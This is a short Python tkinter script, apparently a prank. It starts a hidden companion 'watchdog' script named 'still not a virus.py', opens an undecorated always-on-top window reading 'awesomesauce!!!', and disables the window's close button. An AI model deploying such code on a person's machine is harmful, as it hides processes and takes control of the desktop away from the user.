import tkinter as tk
import os
import subprocess

# Start watchdog
subprocess.Popen(["python", "still not a virus.py"], creationflags=subprocess.CREATE_NO_WINDOW)

root = tk.Tk()
root.overrideredirect(True)  # Remove window decorations
root.attributes('-topmost', True)  # Keep on top
root.geometry(f"+0+0")  # Move to the top-left corner

label = tk.Label(root, text="awesomesauce!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", font=("Arial", 14), fg="black")
label.pack(padx=20, pady=20)

# Prevent closing
def disable_event():
    pass

root.protocol("WM_DELETE_WINDOW", disable_event)

root.mainloop()
